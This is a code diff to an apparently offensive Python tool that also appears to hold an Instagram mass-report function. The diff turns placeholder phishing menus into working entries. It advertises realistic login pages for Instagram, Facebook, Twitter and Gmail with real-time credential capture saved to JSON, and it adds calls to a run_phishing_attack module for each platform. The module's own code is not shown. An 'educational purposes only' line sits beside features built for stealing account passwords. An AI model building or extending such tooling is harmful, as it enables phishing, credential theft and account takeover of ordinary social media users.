@@ -258,8 +258,13 @@ def insta_massreport(username, vpn, amount, spam_bool):
           c_while = c_while+1
 
 phishing_help = '''
-Phishing Tool Under Development! We are currently working on implementing the following phishing code: https://github.com/NullPulse/exaPhisher. 
-If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
+Phishing Tool - Advanced Social Media Phishing Module
+Features:
+• Realistic login pages for Instagram, Facebook, Twitter, and Gmail
+• QR code generation for easy mobile access
+• Real-time credential capture and monitoring
+• Automatic results saving to JSON files
+• Educational purposes only - use responsibly!
 '''
 spam_phishing = '''
 
@@ -281,8 +286,13 @@ If you'd like to contribute, please feel free to create a pull request. Thank yo
 
 
 facebook_ju_phishing  = '''
-Phishing Tool Under Development! We are currently working on implementing the following phishing code: https://github.com/NullPulse/exaPhisher. 
-If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
+Facebook Phishing Tool - Advanced Social Media Phishing Module
+Features:
+• Realistic Facebook login page
+• QR code generation for easy mobile access
+• Real-time credential capture and monitoring
+• Automatic results saving to JSON files
+• Educational purposes only - use responsibly!
 '''
 
 
@@ -292,6 +302,16 @@ def insta_phishing():
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(phishing_help, justify="center", style="#B0DAFF")
   console.print(spam_phishing, justify="center", style="#f91713")
+  
+  # Import and run the phishing tool
+  try:
+    from phishing_tool import run_phishing_attack
+    run_phishing_attack('instagram')
+  except ImportError as e:
+    console.print(f"[red]Error importing phishing tool: {e}[/red]")
+    console.print("[yellow]Please install required dependencies: pip install flask qrcode pillow[/yellow]")
+  except Exception as e:
+    console.print(f"[red]Error running phishing tool: {e}[/red]")
 
 def facebook_massreport():
   os.system("clear")
@@ -309,12 +329,32 @@ def facebook_phishing():
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
   console.print(spam_phishing, justify="center", style="#f91713")
+  
+  # Import and run the phishing tool
+  try:
+    from phishing_tool import run_phishing_attack
+    run_phishing_attack('facebook')
+  except ImportError as e:
+    console.print(f"[red]Error importing phishing tool: {e}[/red]")
+    console.print("[yellow]Please install required dependencies: pip install flask qrcode pillow[/yellow]")
+  except Exception as e:
+    console.print(f"[red]Error running phishing tool: {e}[/red]")
 
 def twitter_phishing():
   os.system("clear")
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
   console.print(spam_phishing, justify="center", style="#f91713")
+  
+  # Import and run the phishing tool
+  try:
+    from phishing_tool import run_phishing_attack
+    run_phishing_attack('twitter')
+  except ImportError as e:
+    console.print(f"[red]Error importing phishing tool: {e}[/red]")
+    console.print("[yellow]Please install required dependencies: pip install flask qrcode pillow[/yellow]")
+  except Exception as e:
+    console.print(f"[red]Error running phishing tool: {e}[/red]")
 
 
 POST_URL = 'https://www.facebook.com/login.php'
@@ -441,3 +481,13 @@ def gmail_phishing():
   console.print(ascii_art, justify="center", style="#B0DAFF bold")
   console.print(facebook_ju_phishing, justify="center", style="#B0DAFF")
   console.print(spam_phishing, justify="center", style="#f91713")
+  
+  # Import and run the phishing tool
+  try:
+    from phishing_tool import run_phishing_attack
+    run_phishing_attack('gmail')
+  except ImportError as e:
+    console.print(f"[red]Error importing phishing tool: {e}[/red]")
+    console.print("[yellow]Please install required dependencies: pip install flask qrcode pillow[/yellow]")
+  except Exception as e:
+    console.print(f"[red]Error running phishing tool: {e}[/red]")
